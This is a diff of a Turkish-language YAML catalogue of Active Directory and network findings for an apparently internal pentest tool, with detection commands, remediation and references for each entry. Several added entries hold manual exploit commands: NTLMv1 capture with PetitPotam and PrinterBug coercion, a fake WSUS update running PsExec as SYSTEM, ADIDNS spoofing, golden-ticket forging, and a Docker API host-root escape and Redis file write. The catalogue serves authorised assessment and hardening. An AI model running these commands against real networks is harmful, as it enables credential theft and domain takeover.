@@ -591,10 +591,10 @@ writable-share:
 
 llmnr-poisoning:
   title: "LLMNR/NBT-NS/mDNS etkin"
-  severity: high
+  severity: medium
   category: config
   mitre: [T1557.001]
-  phase: poison
+  phase: ad
   manual_only: true
   tags: [poisoning, relay]
   summary: "Ad çözümleme zehirleme ile hash yakalama yüzeyi."
@@ -602,19 +602,8 @@ llmnr-poisoning:
     LLMNR/NBT-NS/mDNS açık; yanlış ad çözümleme isteklerine yanıt vererek
     NetNTLM hash yakalanabilir (Responder).
   detect_code: |
-    # Pasif tespit (araç aktif zehirleme yapmaz)
-    sudo responder -I eth0 -A        # analyze modu: sadece dinle, yanıt verme
-  exploit_code: |
-    # YARI MANUEL (opt-in, gözetimli) — aktif zehirleme + kırma
-    sudo responder -I eth0 -wd
-    # Yakalanan NetNTLMv2:
-    hashcat -m 5600 responder_hashes.txt wordlist.txt
-    # veya relay (SMB signing kapalıysa):
-    impacket-ntlmrelayx -tf relay_targets.txt -smb2support
-  exploitation: >
-    YARI MANUEL (opt-in, gözetimli) — Responder analyze/pasif ile yüzey
-    doğrulanır; aktif zehirleme gürültülü, kısa ve kontrollü çalıştırılır.
-  remediation: "LLMNR ve NBT-NS'i GPO ile kapatın; mDNS'i kısıtlayın."
+    # adhealth modülü — hiçbir GPO 'Turn off multicast name resolution' (EnableMulticast=0) ayarlamıyorsa
+    # Pasif doğrulama (MANUEL): sudo responder -I eth0 -A   # analyze: yalnız dinler
   references:
     - "https://book.hacktricks.xyz/windows-hardening/ntlm/llmnr-nbt-ns-poisoning"
 
@@ -652,7 +641,7 @@ ntlmv1-enabled:
   title: "NTLMv1 / zayıf LMCompatibilityLevel"
   severity: high
   category: config
-  phase: smb
+  phase: ad
   manual_only: false
   tags: [ntlm]
   summary: "Downgrade ve kolay kırılan hash."
@@ -660,14 +649,8 @@ ntlmv1-enabled:
     NTLMv1 izinli; yakalanan challenge/response kolayca kırılıp NTLM hash'e
     dönüştürülebilir (crack.sh).
   detect_code: |
-    # nxc ntlmv1 modülü — LMCompatibilityLevel zayıf mı
-    nxc smb <hosts> -u user -p pass -M ntlmv1
-  exploit_code: |
-    # Responder ile NTLMv1 yakala (sabit challenge 1122334455667788):
-    sudo responder -I eth0 --lm
-    # crack.sh ile NT hash'e çevir (NTLMv1 → NTLM), sonra pass-the-hash:
-    nxc smb <ip> -u user -H <nthash>
-  remediation: "LmCompatibilityLevel=5 (yalnız NTLMv2); NTLMv1'i yasaklayın."
+    # adhealth modülü — GPO'da LmCompatibilityLevel <= 2 (GptTmpl.inf / Registry.pol / Registry.xml)
+    #   MACHINE\System\CurrentControlSet\Control\Lsa\LmCompatibilityLevel=4,<0-2>
   references:
     - "https://book.hacktricks.xyz/windows-hardening/ntlm"
 
@@ -865,18 +848,9 @@ gpp-cpassword:
     Group Policy Preferences cpassword alanı, Microsoft'un yayımladığı sabit
     AES anahtarıyla çözülebilir. SYSVOL herkese okunur olduğundan parola açıkta.
   detect_code: |
-    # ad modülü — nxc gpp_password (tespit + çözme OTOMATİK)
-    nxc smb <dc> -u user -p pass -M gpp_password
-  exploit_code: |
-    # Çözülmüş parolayı kullan (sık çok hostta yerel admin)
-    gpp-decrypt '<cpassword_base64>'
-    nxc smb <hosts> -u <gpp_user> -p <decrypted> --local-auth
-  exploitation: >
-    OTOMATİK tespit + çözme (Get-GPPPassword / gpp-decrypt). Çözülen yerel
-    admin parolası sık birçok hostta geçerli.
-  remediation: >
-    MS14-025 yamasını uygulayın; SYSVOL'den cpassword içeren XML'leri silin;
-    LAPS'a geçin.
+    # adhealth modülü — SYSVOL'daki GPP XML'leri indirilir, cpassword YEREL çözülür
+    smbclient //<dc>/SYSVOL -U 'DOM/user%pass' -c 'recurse ON; prompt OFF; mask *.xml; mget *'
+    # cpassword: AES-256-CBC, MS'in yayımladığı sabit anahtar (gpp-decrypt)
   references:
     - "https://learn.microsoft.com/security-updates/securitybulletins/2014/ms14-025"
 
@@ -1266,34 +1240,25 @@ snmp-default-community:
 
 heartbleed:
   title: "Heartbleed (CVE-2014-0160)"
-  severity: high
+  severity: critical
   category: vuln
   cve: [CVE-2014-0160]
-  phase: quickcve
+  phase: exposure
   manual_only: false
   tags: [tls]
   summary: "OpenSSL bellek sızıntısı — anahtar/oturum sızması."
   description: "OpenSSL TLS heartbeat'te sınır dışı okuma; bellekten anahtar/oturum sızar."
   detect_code: |
-    # nmap NSE ile tespit
-    nmap -p443 --script ssl-heartbleed <ip>
-  exploit_code: |
-    # MANUEL — bellek çekme
-    msfconsole -q
-    use auxiliary/scanner/ssl/openssl_heartbleed
-    set RHOSTS <ip>
-    set VERBOSE true
-    run
-  exploitation: "OTOMATİK tespit (ssl-heartbleed NSE). Bellek çekme MANUEL."
-  remediation: "OpenSSL'i yükseltin; etkilenen anahtarları/sertifikaları yenileyin."
+    # exposure modülü — TLS portlarında nmap NSE
+    nmap -Pn -p 443,636,3389,8443 --script ssl-heartbleed <hostlar>
   references:
     - "https://heartbleed.com/"
 
 weak-tls:
   title: "Zayıf/süresi dolmuş/self-signed TLS"
-  severity: medium
+  severity: low
   category: config
-  phase: quickcve
+  phase: exposure
   manual_only: false
   tags: [tls]
   summary: "MITM / güven zaafı."
@@ -1301,13 +1266,8 @@ weak-tls:
     Zayıf şifre takımları (POODLE/DROWN), süresi dolmuş veya self-signed
     sertifikalar; MITM ve güven sorunları.
   detect_code: |
-    # TLS denetimi
-    testssl.sh <host>:443
-    nmap -p443 --script ssl-enum-ciphers <ip>
-  exploit_code: |
-    # MITM bağlamında değerlendirilir (doğrudan exploit yok)
-    # Zayıf cipher/expired cert → kurumsal MITM senaryosu (ör. ARP + sslsplit)
-  remediation: "TLS1.2+ zorunlu, güçlü şifre takımları, geçerli CA sertifikaları."
+    # exposure modülü — SSLv3 / TLS 1.0 / TLS 1.1 kabul eden servisler
+    nmap -Pn -p 443,636,3389,8443 --script ssl-enum-ciphers <hostlar>
   references:
     - "https://github.com/drwetter/testssl.sh"
 
@@ -2089,3 +2049,279 @@ chain-privileged-roast:
     description'a parola yazmayın, yönetici hesaplarına 25+ karakterli parola.
   references:
     - "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
+
+chain-ntlmv1-coercion:
+  title: "Zincir: NTLMv1 + coercion → makine hash'i"
+  severity: critical
+  category: vuln
+  phase: correlate
+  manual_only: true
+  tags: [chain, ntlmv1, coercion]
+  summary: "NTLMv1'e izin veren politika + coerce edilebilir DC → DC makine hash'i → DCSync."
+  description: >
+    GPO makinelere LmCompatibilityLevel <= 2 uyguluyorsa coerce edilen makine NTLMv1
+    yanıtı gönderir. Sabit challenge (1122334455667788) ile yakalanan NTLMv1 yanıtı
+    DES'e indirgenip (crack.sh / hashcat -m 14000) makinenin NT hash'ine çevrilir;
+    makine DC ise DCSync.
+  detect_code: |
+    # correlate modülü: ntlmv1-enabled (adhealth) + coercion (quickcve/sccm)
+  exploit_code: |
+    # MANUEL — Responder'da sabit challenge + ESS kapalı
+    sudo responder -I eth0 --lm --disable-ess
+    python3 PetitPotam.py -u user -p pass <saldirgan-ip> <dc>
+    # NTLMv1 yanıtı → hashcat -m 14000 / crack.sh → DC$ NT hash → secretsdump
+  remediation: >
+    Tüm domainde LmCompatibilityLevel=5 (yalnız NTLMv2, LM/NTLM reddet); NTLM
+    kullanımını denetleyip kısıtlayın; coercion yüzeylerini kapatın.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/ntlm/capture#practice"
+
+gpp-autologon:
+  title: "GPP autologon parolası (SYSVOL, düz metin)"
+  severity: high
+  category: cred
+  phase: ad
+  manual_only: false
+  tags: [gpp, sysvol, autologon, credential]
+  summary: "Registry.xml tercihleri Winlogon DefaultPassword'ü düz metin dağıtıyor."
+  description: >
+    Group Policy Preferences ile otomatik oturum açma (AutoAdminLogon) yapılandırıldığında
+    DefaultUserName ve DefaultPassword değerleri SYSVOL'daki Registry.xml içinde düz
+    metin durur; tüm domain kullanıcıları okuyabilir.
+  detect_code: |
+    # adhealth modülü — SYSVOL Registry.xml içinde Winlogon DefaultPassword
+    smbclient //<dc>/SYSVOL -U 'DOM/user%pass' -c 'recurse ON; prompt OFF; mask Registry.xml; mget *'
+  exploit_code: |
+    # MANUEL — bulunan kimlikle erişim
+    nxc smb <hostlar> -u <kullanıcı> -p '<parola>'
+  remediation: >
+    GPP tercihini silin, parolayı değiştirin; otomatik oturum gerekiyorsa LSA secret
+    ile yerel yapılandırın veya kaldırın.
+  references:
+    - "https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-gpp-autologin"
+
+wsus-http:
+  title: "WSUS HTTP üzerinden yapılandırılmış"
+  severity: high
+  category: config
+  phase: ad
+  manual_only: true
+  tags: [wsus, mitm, gpo]
+  summary: "Güncellemeler şifresiz HTTP ile dağıtılıyor; araya giren SYSTEM komut çalıştırabilir."
+  description: >
+    GPO'daki WUServer http:// ise istemciler WSUS ile şifresiz konuşur. Ağda araya
+    girebilen (ARP/IPv6 DNS zehirleme) saldırgan sahte, Microsoft imzalı bir ikiliyi
+    (PsExec vb.) güncelleme olarak sunup istemcide SYSTEM komut çalıştırabilir veya
+    WSUS kimlik doğrulamasını relay edebilir.
+  detect_code: |
+    # adhealth modülü — Registry.pol / Registry.xml içinde
+    #   Software\Policies\Microsoft\Windows\WindowsUpdate  WUServer = http://...
+  exploit_code: |
+    # MANUEL — araya girme + sahte WSUS
+    python3 pywsus.py -H <saldirgan-ip> -p 8530 -e PsExec64.exe -c '-accepteula -s cmd /c ...'
+  remediation: >
+    WSUS'u HTTPS (SSL) ile yapılandırın ve GPO'da https:// kullanın; mümkünse
+    "proxy kullanımına izin verme" ayarlarını sıkılaştırın.
+  references:
+    - "https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/"
+
+ghost-spn:
+  title: "Ghost SPN — DNS'te çözülmeyen SPN host adı"
+  severity: medium
+  category: config
+  phase: ad
+  manual_only: true
+  tags: [spn, adidns, kerberos, relay]
+  summary: "SPN'in host adı DNS'te yok; ADIDNS ile sahiplenilip kimlik doğrulama yakalanabilir."
+  description: >
+    Bir hesabın SPN'i artık var olmayan bir host adına işaret ediyor. Varsayılan
+    ADIDNS izinleriyle herhangi bir domain kullanıcısı bu adı DNS'e ekleyip kendine
+    yönlendirebilir; o servise bağlanan istemcilerin Kerberos/NTLM kimlik
+    doğrulamaları saldırgana gelir (yakalama/relay). Ayrıca SPN'i taşıyan kullanıcı
+    hesabı Kerberoast edilebilir.
+  detect_code: |
+    # adhealth modülü — LDAP servicePrincipalName host adları → dig @<dc> (toplu)
+  exploit_code: |
+    # MANUEL — adı DNS'e ekle, gelen kimlik doğrulamayı yakala
+    python3 dnstool.py -u 'DOM\user' -p pass -r <ghost-host> -d <saldirgan-ip> --action add <dc>
+    sudo responder -I eth0   # ya da krbrelayx / ntlmrelayx
+  remediation: >
+    Artık kullanılmayan SPN'leri kaldırın (setspn -D); ADIDNS'te Authenticated
+    Users'ın kayıt oluşturma iznini kısıtlayın.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing"
+
+obsolete-os:
+  title: "Desteği bitmiş işletim sistemi"
+  severity: high
+  category: config
+  phase: ad
+  manual_only: false
+  tags: [eol, patching]
+  summary: "Güvenlik güncellemesi almayan sistemler (XP/7/8, Server 2003/2008/2012)."
+  description: >
+    AD'de etkin bilgisayar hesabı olan ve üreticinin desteği bitmiş işletim
+    sistemleri artık güvenlik güncellemesi almaz; MS17-010, MS08-067 gibi uzaktan
+    kod çalıştırma zafiyetleri kalıcı olarak açık kalabilir.
+  detect_code: |
+    # adhealth modülü — LDAP operatingSystem (etkin bilgisayar hesapları)
+    nxc ldap <dc> -u user -p pass --query "(&(objectCategory=computer)(operatingSystem=*))" "dNSHostName operatingSystem"
+  exploit_code: |
+    # MANUEL — hosta özel bilinen zafiyetleri kontrol et (ör. nmap --script smb-vuln-ms17-010)
+  remediation: >
+    Sistemi desteklenen bir sürüme yükseltin; mümkün değilse ağdan izole edin ve
+    ESU (genişletilmiş destek) alın.
+  references:
+    - "https://learn.microsoft.com/en-us/lifecycle/products/"
+
+krbtgt-old-password:
+  title: "krbtgt parolası uzun süredir değişmemiş"
+  severity: medium
+  category: config
+  phase: ad
+  manual_only: false
+  tags: [krbtgt, golden-ticket]
+  summary: "Eski bir ele geçirmeden kalan Golden Ticket'lar hâlâ geçerli olabilir."
+  description: >
+    krbtgt hesabının parolası 180 günden uzun süredir değişmemiş. Geçmişte domain
+    ele geçirildiyse saldırganın krbtgt hash'iyle ürettiği Golden Ticket'lar bu
+    süre boyunca geçerli kalır.
+  detect_code: |
+    # adhealth modülü — LDAP krbtgt pwdLastSet
+  exploit_code: |
+    # (yalnız krbtgt hash'i ele geçirilmişse) impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain DOM Administrator
+  remediation: >
+    krbtgt parolasını, replikasyonun tamamlanmasını bekleyerek iki kez değiştirin
+    (Microsoft New-KrbtgtKeys.ps1) ve bunu düzenli (ör. 180 günde bir) yapın.
+  references:
+    - "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password"
+
+passwd-notreqd:
+  title: "PASSWD_NOTREQD bayraklı etkin hesap"
+  severity: medium
+  category: config
+  phase: ad
+  manual_only: true
+  tags: [password-policy, uac]
+  summary: "Hesaba parola politikası uygulanmaz; boş parolalı olabilir."
+  description: >
+    userAccountControl'de PASSWD_NOTREQD (0x20) bayrağı olan hesaplar parola
+    politikasından muaftır ve boş parolaya sahip olabilir. Araç parola denemez;
+    durum manuel doğrulanır.
+  detect_code: |
+    # adhealth modülü
+    nxc ldap <dc> -u user -p pass --query "(userAccountControl:1.2.840.113556.1.4.803:=32)" "sAMAccountName userAccountControl"
+  exploit_code: |
+    # MANUEL (izinliyse, tek deneme): nxc smb <dc> -u <hesap> -p ''
+  remediation: >
+    Bayrağı kaldırın (Set-ADUser -PasswordNotRequired $false) ve hesaba güçlü bir
+    parola atayın.
+  references:
+    - "https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties"
+
+domain-trusts:
+  title: "Domain trust ilişkileri"
+  severity: info
+  category: info
+  phase: ad
+  manual_only: false
+  tags: [trust, lateral-movement]
+  summary: "Güvenilen/güvenen domainler (yanal geçiş yüzeyi)."
+  description: >
+    Domain'in diğer domain/forest'larla güven ilişkileri. Çift yönlü veya SID
+    filtrelemesi kapalı trust'lar bir domainden diğerine yetki taşımaya imkân verir.
+  detect_code: |
+    # adhealth modülü — LDAP (objectClass=trustedDomain)
+  exploit_code: |
+    # MANUEL — trust üzerinden numaralandırma
+    nxc ldap <dc> -u user -p pass --dc-list
+    bloodhound-python -d <diğer-domain> ...
+  remediation: >
+    Gereksiz trust'ları kaldırın; forest trust'larında SID filtreleme ve seçici
+    kimlik doğrulama kullanın.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/trusts"
+
+badsuccessor:
+  title: "BadSuccessor (dMSA) yüzeyi — Windows Server 2025 DC"
+  severity: high
+  category: vuln
+  phase: ad
+  manual_only: true
+  tags: [dmsa, badsuccessor, server-2025]
+  summary: "OU'da nesne oluşturabilen kullanıcı dMSA ile herhangi bir hesabı devralabilir."
+  description: >
+    Windows Server 2025 DC'lerdeki delegated Managed Service Account (dMSA) özelliği,
+    bir OU'da nesne oluşturma yetkisi olan kullanıcının dMSA oluşturup
+    msDS-ManagedAccountPrecededByLink ile herhangi bir hesabın (Domain Admin dahil)
+    yetkilerini devralmasına izin verir.
+  detect_code: |
+    # adhealth modülü — LDAP: Windows Server 2025 işletim sistemli DC var mı
+    # Yetkili principal doğrulaması (MANUEL): nxc ldap <dc> -u user -p pass -M badsuccessor
+  exploit_code: |
+    # MANUEL
+    nxc ldap <dc> -u user -p pass -M badsuccessor
+    # SharpSuccessor / BadSuccessor.ps1 ile dMSA oluştur → hedef hesabın anahtarlarıyla TGT
+  remediation: >
+    Microsoft güncellemesini uygulayın; OU'lardaki CreateChild (msDS-DelegatedManagedServiceAccount)
+    yetkilerini yalnız tier-0 yöneticileriyle sınırlayın.
+  references:
+    - "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory"
+
+spooler-enabled:
+  title: "Print Spooler açık (PrinterBug coercion)"
+  severity: medium
+  category: config
+  phase: poison
+  manual_only: true
+  tags: [spooler, coercion, printerbug]
+  summary: "Spooler açık her makine herhangi bir domain kullanıcısınca coerce edilebilir."
+  description: >
+    Print Spooler (MS-RPRN) açık bir makine, herhangi bir domain kullanıcısının
+    isteğiyle saldırgana makine hesabıyla kimlik doğrular (PrinterBug). Bu kimlik
+    imzasız SMB/LDAP/AD CS'e relay edilebilir veya unconstrained delegation'lı bir
+    hosta TGT bırakır. Yazdırma yapmayan sunucularda ve özellikle DC'lerde kapatılmalıdır.
+  detect_code: |
+    # poison modülü
+    nxc smb <hostlar> -u user -p pass -M spooler
+  exploit_code: |
+    # MANUEL
+    python3 printerbug.py DOM/user:pass@<hedef> <saldirgan-ip>
+  remediation: >
+    Yazıcı paylaşmayan sunucularda (özellikle DC'lerde) Print Spooler'ı durdurup
+    devre dışı bırakın.
+  references:
+    - "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn"
+
+unauth-service:
+  title: "Kimlik doğrulamasız erişilen servis"
+  severity: high
+  category: config
+  phase: exposure
+  manual_only: true
+  tags: [ftp, redis, elasticsearch, docker, nfs, vnc]
+  summary: "Anonim FTP, Redis, Elasticsearch, Docker API, NFS veya VNC kimliksiz erişilebilir."
+  description: >
+    Kimlik bilgisi olmadan veri okunabilen ya da servisin yönetilebildiği servisler:
+    anonim FTP, kimliksiz Redis (dosya yazma → komut çalıştırma), Elasticsearch REST
+    API (tüm indeksler), Docker Engine API (host'ta root), herkese açık NFS
+    export'ları ve güvenlik türü "None" olan VNC.
+  detect_code: |
+    # exposure modülü (yalnız açık portlarda)
+    curl --user anonymous:anonymous ftp://<ip>/
+    redis-cli -h <ip> INFO server
+    curl http://<ip>:9200/            # "cluster_name"
+    curl http://<ip>:2375/version     # "ApiVersion"
+    showmount -e <ip>
+    # VNC: RFB el sıkışmasında güvenlik türü 1 (None)
+  exploit_code: |
+    # MANUEL — örnekler
+    redis-cli -h <ip> CONFIG SET dir /root/.ssh   # (yetkiliyse) dosya yazma
+    docker -H tcp://<ip>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
+    mount -t nfs <ip>:/<export> /mnt
+  remediation: >
+    Servislere kimlik doğrulama zorunluluğu getirin (requirepass, xpack security,
+    TLS'li Docker API, VNC parolası), anonim FTP'yi kapatın, NFS export'larını
+    istemci IP'leriyle sınırlayın ve bu portları ağ seviyesinde filtreleyin.
+  references:
+    - "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
